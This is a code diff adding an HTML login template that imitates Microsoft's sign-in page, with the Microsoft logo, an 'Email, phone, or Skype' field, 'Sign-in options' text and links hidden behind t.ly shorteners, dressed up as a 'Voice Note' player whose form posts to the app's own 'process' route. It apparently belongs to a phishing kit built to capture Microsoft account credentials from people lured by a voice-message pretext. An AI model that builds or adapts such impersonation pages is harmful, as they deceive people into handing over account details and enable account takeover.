@@ -1,0 +1,33 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Login Page</title>
+  <link rel="stylesheet" href="/static/index.css">
+</head>
+<body>
+  <div class="container" id="loginContainer">
+    <div class="miclogo"><img src="/static/images/microsoft_logo.png" alt="img"><p>Microsoft</p>
+    </div>
+    <div class="sign"><p>Voice Note</p></div>
+    
+    <form action="{{ url_for('process') }}" method="post">
+      <div class="form-group">
+        <input type="text" id="username" name="username" placeholder="Email, phone, or Skype" required>
+      </div>
+      <div class="no_acc"><p>No account?</p><p class="p2">Create <a href="https://t.ly/khCBW"></a> one!</a></p></div>
+      <div class="access_acc"><p>Can't access your account?<a href="https://t.ly/oHda2"></a></p></div>
+      <div class="form-group2">
+        <button class="back" type="submit">Stop</button>
+        <button class="next" type="submit" onclick="nextPage()">Play</button>
+      </div>
+    </form>
+    <div class="login-downcontainer"> 
+        <img class="key" src="/static/images/key.png" alt="">
+        <p class="option">Sign-in options</p>
+    </div>
+  </div>
+  
+</body>
+</html>
